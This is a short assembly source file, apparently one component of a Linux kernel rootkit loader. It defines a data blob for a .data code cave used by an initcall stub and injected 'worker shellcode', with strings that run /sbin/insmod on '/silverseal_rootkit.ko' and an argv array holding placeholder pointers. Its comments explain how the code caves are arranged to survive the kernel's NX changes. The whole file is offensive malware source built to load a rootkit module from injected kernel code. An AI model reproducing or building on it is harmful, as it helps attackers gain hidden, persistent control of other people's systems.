; lkm_loader.asm
; Data-only blob used by the initcall stub and worker shellcode.
;
; This blob is intentionally not executable. It lives in a .data cave and holds
; the work item, modprobe strings, and argv[] array. Executable code lives in
; separate .text caves so the kernel's .data NX transition cannot break the
; deferred worker path.

BITS 64

; struct work_struct: 32 bytes, initialized by lkm_stager.asm at runtime.
work_struct_data:
    times   32 db 0

path_buffer:
    db      "/sbin/insmod", 0
    db      "/silverseal_rootkit.ko", 0
    times   (128 - ($ - path_buffer)) db 0

argv_buffer:
    dq      0xAAAAAAAAAAAAAAAA
    dq      0xBBBBBBBBBBBBBBBB
    dq      0
